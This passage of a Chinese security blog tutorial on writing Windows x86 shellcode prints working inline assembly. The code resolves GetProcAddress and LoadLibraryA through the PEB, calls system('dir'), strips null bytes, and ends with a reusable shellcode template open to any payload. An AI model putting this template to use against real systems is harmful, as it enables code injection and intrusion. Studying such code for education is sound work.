class="line">  push 0x74737973    </span><br><span class="line">  push esp;    </span><br><span class="line">  push eax;    </span><br><span class="line">  call edx;    </span><br><span class="line">  add esp,0x10</span><br><span class="line">;然后就是利用system函数去执行命令了    </span><br><span class="line">  xor ebx, ebx    </span><br><span class="line">  mov ebx, 0x726964    </span><br><span class="line">  push ebx    </span><br><span class="line">  push esp    </span><br><span class="line">  call eax</span><br><span class="line">;注意栈平衡就行    </span><br><span class="line">  add esp, 0x8    </span><br><span class="line">  popfd    </span><br><span class="line">  popad</span><br></pre></td></tr></table></figure>

<p>这里我只是去调用system函数，其他函数可以类推，我们只要拿到了GetProcAddress和LoadLibraryA这两个函数的地址，然后就天高任鸟飞了，实际的shellcode可能实际就封装成一个函数调用了</p>
<p>通过调试，需要去除push 0x0 这样的汇编会出现x00这样的空字节，会截断字符串，所以用了一个push 寄存器来代替，再加上一个推出函数。</p>
<p>调试………………….完整代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  _asm &#123;</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    mov eax, fs: [ecx + 0x30] </span><br><span class="line">    mov eax, [eax + 0xc]</span><br><span class="line">    mov esi, [eax + 0x14]</span><br><span class="line">    lodsd</span><br><span class="line">    xchg eax, esi</span><br><span class="line">    lodsd</span><br><span class="line">    mov ebx, [eax + 0x10]</span><br><span class="line">    push ebx</span><br><span class="line">    mov edx, [ebx + 0x3c]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov edx, [edx + 0x78]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov esi, [edx + 0x20]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">Get_Function_GetProcAddress:</span><br><span class="line">    inc ecx</span><br><span class="line">    lodsd</span><br><span class="line">    add eax, ebx</span><br><span class="line">    cmp dword ptr[eax], 0x50746547</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x4], 0x41636f72</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x8], 0x65726464</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    mov esi, [edx + 0x24]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov cx, [esi + ecx * 2]</span><br><span class="line">    dec ecx</span><br><span class="line">    mov esi, [edx + 0x1c]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov edx, [esi + ecx * 4]</span><br><span class="line">    add edx, ebx</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push edx</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x41797261</span><br><span class="line">    push 0x7262694c</span><br><span class="line">    push 0x64616f4c</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line"></span><br><span class="line">    add esp, 0x10</span><br><span class="line">    push eax</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov cx, 0x6c6c</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x642e7472</span><br><span class="line">    push 0x6376736d</span><br><span class="line">    push esp</span><br><span class="line">    call eax;</span><br><span class="line"></span><br><span class="line">    add esp, 0x10;</span><br><span class="line">    mov edx, [esp + 0x4]</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov ecx, 0x616E6F74</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x6d65</span><br><span class="line">    push 0x74737973</span><br><span class="line">    push esp;</span><br><span class="line">    push eax;</span><br><span class="line">    call edx;</span><br><span class="line">    add esp,0x10</span><br><span class="line"></span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov ebx, 0x726964</span><br><span class="line">    push ebx</span><br><span class="line">    push esp</span><br><span class="line">    call eax</span><br><span class="line">    add esp, 0xc</span><br><span class="line"></span><br><span class="line">    pop edx</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, 0x61737365</span><br><span class="line">    push ecx</span><br><span class="line">    sub dword ptr[esp + 0x3], 0x61</span><br><span class="line">    push 0x636f7250</span><br><span class="line">    push 0x74697845</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    call eax</span><br><span class="line">    ret</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从我们编写的汇编来看，代码逻辑很简单，就是要注意其中的堆栈平衡即可，从整个shellcode来看，前面找GetProcAddress和LoadLibraryA这两个函数是固定的，只要找到这两个，我们就能利用它们来查找任意的函数来执行，所以这里就总结出一个shellcode编写框架：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">    xor ecx, ecx</span><br><span class="line">    mov eax, fs: [ecx + 0x30] </span><br><span class="line">    mov eax, [eax + 0xc]</span><br><span class="line">    mov esi, [eax + 0x14]</span><br><span class="line">    lodsd</span><br><span class="line">    xchg eax, esi</span><br><span class="line">    lodsd</span><br><span class="line">    mov ebx, [eax + 0x10]</span><br><span class="line">    push ebx</span><br><span class="line">    mov edx, [ebx + 0x3c]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov edx, [edx + 0x78]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov esi, [edx + 0x20]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">Get_Function_GetProcAddress:</span><br><span class="line">    inc ecx</span><br><span class="line">    lodsd</span><br><span class="line">    add eax, ebx</span><br><span class="line">    cmp dword ptr[eax], 0x50746547</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x4], 0x41636f72</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x8], 0x65726464</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    mov esi, [edx + 0x24]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov cx, [esi + ecx * 2]</span><br><span class="line">    dec ecx</span><br><span class="line">    mov esi, [edx + 0x1c]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov edx, [esi + ecx * 4]</span><br><span class="line">    add edx, ebx</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push edx</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x41797261</span><br><span class="line">    push 0x7262694c</span><br><span class="line">    push 0x64616f4c</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line"></span><br><span class="line">    add esp, 0x10</span><br><span class="line">    push eax</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov cx, 0x6c6c; ll</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x642e7472</span><br><span class="line">    push 0x6376736d</span><br><span class="line">    push esp</span><br><span class="line">    call eax;</span><br><span class="line">    add esp, 0x10;</span><br><span class="line"></span><br><span class="line">    ;这里填入想要执行的一些shellcode，这时候GetProcAddress和LoadLibraryA都在栈上，都可供调用。</span><br><span class="line">    ;esp LoadLibraryA_addr</span><br><span class="line">    ;esp+4 GetProcAddress</span><br><span class="line">    ;esp+8 Kernel32.dll</span><br><span class="line"></span><br><span class="line">    add esp, 0x8</span><br><span class="line">    pop edx</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, 0x61737365</span><br><span class="line">    push ecx</span><br><span class="line">    sub dword ptr[esp + 0x3], 0x61</span><br><span class="line">    push 0x636f7250</span><br><span class="line">    push 0x74697845</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    call eax</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<p>因为想着如果用调试器去截取shellcode很麻烦，然后自己用c++写了个小程序，用nasm来把汇编代码编译成机器码，实际效果：</p>
<p>在_asm文件中放入我们写好的shellcode，当然你也可以指定其他文件名：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/424431700.png"></p>
<p>然后执行程序 asm_shellcode.exe  文件名  位数（可不指定，默认32）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84300700.png"></p>
<p>但是有一点得注意mov eax, fs: [ecx + 0x30] 会编译出错，必须得改成mov eax, [fs: ecx + 0x30] 才行，然后尝试加载shellcode执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/177087977.png"></p>
<p>这里就应该差不多了，一路套娃就行了。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/">http://example.com/2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mssn Harvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/shellcode/">shellcode</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(3).png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/28/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/ctfyx.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF-图片隐写那些事儿</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/21/2021SXCCTF/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/SXCTF2021.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SXCCTF 2021</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/29/shellcode免杀框架内附SysWhispers2_x86直接系统调用/" title="shellcode免杀框架内附SysWhispers2_x86直接系统调用"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(19).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-29</div><div class="title">shellcode免杀框架内附SysWhispers2_x86直接系统调用</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Waline</span><span class="switch-btn"></span><span class="second-comment">Disqusjs</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Harvey</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MssnHarvey/mssnharvey.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=3305601910" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://t.me/MssnHarvey" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://github.com/MssnHarvey" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3305601910@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Welcome to Harvey'Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">1.前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-kernel32-dll"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 kernel32.dll</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-LoadLibrary"><span class="toc-number">2.2.</span> <span class="toc-text">2.3 LoadLibrary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-number">2.3.</span> <span class="toc-text">2.4 PE文件格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-PEB"><span class="toc-number">2.4.</span> <span class="toc-text">2.5 PEB</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%BC%96%E5%86%99shellcode"><span class="toc-number">3.</span> <span class="toc-text">3.编写shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-c-%E5%BA%93%E6%96%87%E4%BB%B6%E9%85%8D%E5%90%88%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 c++库文件配合内联汇编</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E4%BB%8EPEB%E8%A1%A8%E6%9F%A5%E6%89%BELoadLibraryA%EF%BC%8CGetProcAddress"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 从PEB表查找LoadLibraryA，GetProcAddress</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E8%8E%B7%E5%8F%96system%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 获取system函数地址</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(2).png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次对某大学的逻辑漏洞"/></a><div class="content"><a class="title" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞">记一次对某大学的逻辑漏洞</a><time datetime="2021-03-20T13:11:00.000Z" title="发表于 2021-03-20 21:11:00">2021-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/" title="内网基础-定位域管理员"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(28).jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网基础-定位域管理员"/></a><div class="content"><a class="title" href="/2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/" title="内网基础-定位域管理员">内网基础-定位域管理员</a><time datetime="2021-03-18T10:21:20.000Z" title="发表于 2021-03-18 18:21:20">2021-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="内网渗透-信息收集"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(64).jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透-信息收集"/></a><div class="content"><a class="title" href="/2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="内网渗透-信息收集">内网渗透-信息收集</a><time datetime="2021-03-17T06:21:20.000Z" title="发表于 2021-03-17 14:21:20">2021-03-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1689581160.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-Web分类练习"/></a><div class="content"><a class="title" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习">BUUCTF-Web分类练习</a><time datetime="2021-03-16T06:33:20.000Z" title="发表于 2021-03-16 14:33:20">2021-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-3靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告">DC-3靶机渗透测试报告</a><time datetime="2021-03-15T06:11:00.000Z" title="发表于 2021-03-15 14:11:00">2021-03-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Harvey</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><img src="https://web-resource.mucang.cn/maiche.web/mucang.official/official/resources/images/new-version/beian.png" width="20" height="20" /> </img> 闽ICP备20002768号</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadWaline () {
  function initWaline () {
    let initData = {
      el: '#waline-wrap',
      serverURL: 'https://butterfly-waline.vercel.app',
      avatar: 'monsterid',
      path: location.pathname,
      emojiCDN: '',
      emojiMaps: "",
    }
    
    if (true) {
      const otherData = {"placeholder":"請先查看文檔再詢問。主題如有報錯，請試着解決。提問題時請詳細描述遇到的問題，附上相關的報錯 / 截圖 / 網址。","pageSize":8,"lang":"zh-TW","requiredFields":["nick","mail"]}
      initData = Object.assign(initData, otherData)
    }
    
    const waline = new Waline(initData)
  }

  if (typeof Waline === 'function') initWaline() 
  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
}

if ('Waline' === 'Waline' || !true) {
  if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
  else setTimeout(loadWaline, 0)
} else {
  function loadOtherComment () {
    loadWaline()
  }
}</script><script>function loadDisqusjs () {
  function addDisqusjsCSS () {
    const ele = document.createElement('link')
    ele.rel = 'stylesheet'
    ele.href= 'https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css'
    document.getElementsByTagName('head')[0].appendChild(ele)
  }

  function initDisqusjs () {
    window.DISQUS = null
    new DisqusJS({
      shortname: 'demo-jerryc-me',
      siteName: 'JerryC',
      identifier: '2021/02/24/shellcode编写指南/',
      url: 'http://example.com/2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/',
      title: 'shellcode编写指南',
      api: 'https://disqus.skk.moe/disqus/',
      apikey: 'nrSx8ZhuHvjwDeKauPZ3lMnyLb7iR92BT4wl4AlKG4eJl27jxXlzOeLQ9SJP1RDW',
      nocomment: '',
      admin: '',
      adminLabel: ''
    });
  }

  window.disqusReset = initDisqusjs

  if (window.disqusJsLoad) initDisqusjs()
  else {
    addDisqusjsCSS()
    getScript('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js').then(initDisqusjs)
    window.disqusJsLoad = true
  }
}

if ('Waline' === 'Disqusjs' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqusjs)
  else loadDisqusjs()
}
else {
  function loadOtherComment () {
    loadDisqusjs()
  }
}

</script></div><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>